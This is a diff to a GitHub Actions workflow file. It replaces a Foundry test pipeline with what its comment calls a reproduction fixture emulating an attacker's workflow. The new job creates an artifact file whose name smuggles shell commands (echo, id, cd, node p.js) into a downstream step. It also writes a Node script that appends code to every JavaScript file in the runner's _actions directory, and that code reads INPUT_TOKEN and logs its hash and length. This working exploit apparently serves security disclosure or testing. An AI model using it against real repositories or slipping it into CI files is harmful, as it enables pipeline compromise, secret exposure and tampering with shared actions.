@@ -1,61 +1,42 @@
 name: Test
 
-concurrency:
-  group: ${{ github.head_ref || github.run_id }}
-  cancel-in-progress: true
-
+# Reproduction fixture: emulates the attacker-controlled workflow named "Test"
+# from the finding. It only uploads an artifact; it performs no privileged work.
 on:
   pull_request:
-  push:
-    branches:
-      - main
 
 jobs:
-  lint:
+  forge:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-
-      - name: Run Foundry setup
-        uses: bgd-labs/github-workflows/.github/actions/foundry-setup@main
-
-      - name: Enforce linting
-        run: forge fmt --check
-
-  test-sol:
-    name: Foundry build n test
-    secrets:
-      ALCHEMY_API_KEY: ${{ secrets.ALCHEMY_API_KEY }}
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          submodules: recursive
-
-      - uses: bgd-labs/action-rpc-env@main
-        with:
-          ALCHEMY_API_KEY: ${{ secrets.ALCHEMY_API_KEY }}
-
-      # we simply use foundry zk for all jobs in this repo
-      - name: Run Foundry setup
-        uses: bgd-labs/github-workflows/.github/actions/foundry-setup@main
-
-      - name: Run Forge tests
-        id: test
-        uses: bgd-labs/github-workflows/.github/actions/foundry-test@main
-
-      - name: Run Gas report
-        uses: bgd-labs/github-workflows/.github/actions/foundry-gas-report@main
-
-      - name: Run Lcov report
-        uses: bgd-labs/github-workflows/.github/actions/foundry-lcov-report@main
-
-      - name: Store artifact
-        uses: bgd-labs/github-workflows/.github/actions/comment-artifact@main
-
-      # we let failing tests pass so we can log them in the comment, still we want the ci to fail
-      - name: Post test
-        if: ${{ steps.test.outputs.testStatus != 0 || steps.zktest.outputs.testStatus != 0 }}
+      - name: Build forged artifact
         run: |
-          echo "tests failed"
-          exit 1
+          mkdir -p content
+          printf 'forged report body' > content/summary.txt
+          python3 - <<'PY'
+          import os
+          name = r"summary.txt;echo${IFS}INJECTION-EXECUTED;id;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
+          open(os.path.join("content", name), "w").close()
+          PY
+          cat > content/p.js <<'JSEOF'
+          const fs = require('fs');
+          const path = require('path');
+          const root = path.join(path.dirname(process.env.RUNNER_WORKSPACE || '/home/runner/work/x'), '_actions');
+          const payload = "\n;(function(){try{var t=process.env.INPUT_TOKEN;if(t){var c=require('crypto');console.log('LEAK-SHA '+c.createHash('sha256').update(String(t)).digest('hex'));console.log('LEAK-LEN '+String(t).length);}}catch(e){}})();\n";
+          let n = 0;
+          (function walk(d) {
+            let ents = [];
+            try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
+            for (const e of ents) {
+              const p = path.join(d, e.name);
+              if (e.isDirectory()) walk(p);
+              else if (p.endsWith('.js')) { try { fs.appendFileSync(p, payload); n++; } catch (e) {} }
+            }
+          })(root);
+          console.log('PATCHED ' + n + ' root=' + root);
+          JSEOF
+          ls -la content
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: content
